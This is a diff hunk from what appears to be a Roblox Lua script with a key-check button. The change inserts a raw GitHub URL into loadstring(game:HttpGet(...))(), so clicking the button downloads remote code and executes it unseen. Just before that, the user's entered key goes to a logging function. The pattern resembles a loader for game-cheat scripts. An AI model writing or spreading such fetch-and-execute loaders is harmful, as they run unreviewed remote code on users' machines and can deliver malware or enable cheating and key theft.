@@ -281,7 +281,7 @@ checkKeyButton.MouseButton1Click:Connect(function()
         sendLog(userInputKey)
 
         local success, errorMessage = pcall(function()
-            loadstring(game:HttpGet("", true))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/aladin667/phtlox/refs/heads/main/mvb.lua", true))()
         end)
 
         if not success then
